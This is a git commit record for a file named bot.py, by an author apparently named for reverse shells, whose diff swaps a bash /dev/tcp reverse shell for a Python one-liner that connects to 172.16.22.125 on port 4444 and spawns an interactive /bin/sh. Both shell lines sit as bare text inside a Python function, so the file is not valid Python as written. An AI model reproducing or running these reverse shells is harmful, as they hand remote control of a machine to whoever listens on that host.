bb55a7c0b61c44d248a3f7071b581ca032b9fc79
ReverseShellOnU <158079078+ReverseShellOnU@users.noreply.github.com>
2024-01-29 19:12:30 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,5 +1,6 @@
 import subprocess 
  
-def run():		
-	bash -i >& /dev/tcp/172.16.22.125/4444 0>&1
+def run():
+		
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.22.125",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 run()
